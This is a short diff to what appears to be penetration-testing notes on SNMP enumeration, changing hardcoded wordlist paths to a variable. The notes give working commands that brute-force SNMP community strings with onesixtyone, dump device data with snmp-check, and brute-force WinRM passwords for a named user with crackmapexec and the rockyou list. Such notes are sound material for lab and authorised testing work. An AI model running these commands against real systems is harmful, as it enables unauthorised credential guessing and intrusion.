@@ -18,7 +18,7 @@ nmap -n -vv -sV -sU -Pn -p161,162 --script=snmp-processes,snmp-netstat $VICTIM_I
 1. `onesixtyone` is a **tool that scans for SNMP access**.
 It tries a list of **common SNMP "passwords" (called community strings)** to see if the device will respond.
 ```bash
-onesixtyone $VICTIM_IP -c /usr/share/wordlists/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
+onesixtyone $VICTIM_IP -c $WORDLIST_PATH/seclists/Discovery/SNMP/common-snmp-community-strings-onesixtyone.txt
 ```
 2. if `onesixtyone` identified any device/string  then We can then run this with snmp-check to dump all available SNMP information.
 ```bash
@@ -27,7 +27,7 @@ snmp-check -c openview $VICTIM_IP
 3. Looking through the results if we find a non default username we can bruteforce it 
 
 ```
-crackmapexec winrm $VICTIM_IP -u Jareth -p /usr/share/wordlists/rockyou.txt | grep '(Pwn3d!)'
+crackmapexec winrm $VICTIM_IP -u Jareth -p $WORDLIST_PATH/rockyou.txt | grep '(Pwn3d!)'
 ```
 
 4. if you found creds then connect
